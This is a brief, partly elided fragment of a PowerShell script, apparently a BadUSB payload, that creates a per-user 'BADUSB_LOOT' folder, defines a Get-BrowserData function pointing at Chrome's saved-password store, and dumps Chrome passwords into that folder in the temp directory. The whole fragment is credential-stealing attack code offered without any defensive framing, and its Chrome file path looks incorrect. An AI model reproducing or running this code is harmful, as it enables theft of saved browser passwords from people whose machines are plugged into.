...
$FolderName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)-BADUSB_LOOT"
...
function Get-BrowserData {
    ...
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'passwords' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\passwords.db"}
...
Get-BrowserData -Browser "chrome" -DataType "passwords" >> $env:TMP\$FolderName\passwords.db
